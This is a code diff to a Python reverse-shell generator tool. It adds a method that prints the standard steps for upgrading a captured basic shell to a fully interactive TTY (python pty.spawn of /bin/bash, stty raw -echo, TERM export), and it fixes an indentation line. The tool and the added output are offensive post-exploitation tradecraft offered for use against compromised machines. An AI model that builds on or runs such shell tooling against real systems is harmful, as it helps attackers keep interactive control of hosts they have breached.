@@ -43,6 +43,7 @@ class Reverse_Shell_Generator:
             self.control()
             self.Check_Inpiut()
             self.Selcet()
+            self.Upgrade_shell()
         def Selcet(self):
             if "python" in self.args.type and not self.args.onefile :
                 if not self.args.windows:
@@ -326,6 +327,23 @@ class Reverse_Shell_Generator:
                 print('[*] Getshell not support : ',self.args.type +'\n'+'='*30)  
                 for i in list_input :
                     print('[*] Support type is : ',i)       
-                exit()               
+                exit()      
+        def Upgrade_shell(self):
+            Fprint = ""
+            Fprint +="""[+] python3 -c 'import pty;pty.spawn("/bin/bash")'\n"""
+            Fprint +="[+] stty rows\n"
+            Fprint +="[+] stty raw -echo;fg\n"
+            Fprint +="[+] xterm\n"
+            Fprint +="[+] export TERM=xterm\n"
+            Fprint +="[+] stty rows 19 columns 125\n"                 
+            
+            
+            if "python" not in self.args.type:
+                print("\n"+"="*40+"\n\n"+"Upgrading a basic shell to a fully interactive TTY shell using Python \n\n"+Fprint)
+                exit()
+            else :
+                print("\n"+"="*40+"\n\n"+"Upgrading a basic shell to a fully interactive TTY shell  \n\n"+Fprint[50:])
+                exit()
+
 if __name__=='__main__':
-   Reverse_Shell_Generator()  
+    Reverse_Shell_Generator()  
